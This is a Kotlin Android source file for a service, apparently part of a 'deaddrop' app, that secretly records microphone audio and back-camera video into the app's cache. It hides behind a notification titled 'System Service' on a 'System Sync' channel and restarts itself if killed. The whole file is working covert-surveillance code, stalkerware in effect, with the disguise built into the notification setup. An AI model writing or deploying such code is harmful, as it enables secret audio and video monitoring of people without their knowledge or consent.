package com.example.deaddrop

import android.app.*
import android.content.*
import android.hardware.camera2.*
import android.media.*
import android.os.*
import android.util.Log
import android.view.Surface
import androidx.core.app.NotificationCompat
import java.io.File

class RecordingService : Service() {
    private var audioRecorder: MediaRecorder? = null
    private var videoRecorder: MediaRecorder? = null
    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val channelId = "DeaddropCapture"
        val channel = NotificationChannel(channelId, "System Sync", NotificationManager.IMPORTANCE_LOW)
        getSystemService(NotificationManager::class.java).createNotificationChannel(channel)

        startForeground(1, NotificationCompat.Builder(this, channelId)
            .setContentTitle("System Service")
            .setSmallIcon(android.R.drawable.ic_menu_manage).build())

        startAudioCapture()
        startVideoCapture()
        return START_STICKY
    }

    private fun startAudioCapture() {
        audioRecorder = MediaRecorder().apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            setOutputFile(File(cacheDir, "drop_audio.mp4").absolutePath)
            prepare()
            start()
        }
    }

    private fun startVideoCapture() {
        val manager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        try {
            val cameraId = manager.cameraIdList[0] // Usually the back camera
            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    prepareVideoRecorder()
                    startVideoRecording()
                }
                override fun onDisconnected(camera: CameraDevice) { camera.close() }
                override fun onError(camera: CameraDevice, error: Int) { camera.close() }
            }, null)
        } catch (e: Exception) { Log.e("DD", "Cam Error: ${e.message}") }
    }

    private fun prepareVideoRecorder() {
        videoRecorder = MediaRecorder().apply {
            setVideoSource(MediaRecorder.VideoSource.SURFACE)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setVideoEncoder(MediaRecorder.VideoEncoder.H264)
            setVideoEncodingBitRate(10000000)
            setVideoFrameRate(30)
            setVideoSize(1280, 720)
            setOutputFile(File(cacheDir, "drop_video.mp4").absolutePath)
            prepare()
        }
    }

    private fun startVideoRecording() {
        val surface = videoRecorder?.surface ?: return
        cameraDevice?.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
            override fun onConfigured(session: CameraCaptureSession) {
                captureSession = session
                val builder = cameraDevice?.createCaptureRequest(CameraDevice.TEMPLATE_RECORD)
                builder?.addTarget(surface)
                session.setRepeatingRequest(builder!!.build(), null, null)
                videoRecorder?.start()
            }
            override fun onConfigureFailed(s: CameraCaptureSession) {}
        }, null)
    }

    override fun onDestroy() {
        audioRecorder?.stop(); audioRecorder?.release()
        videoRecorder?.stop(); videoRecorder?.release()
        captureSession?.close()
        cameraDevice?.close()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?) = null
}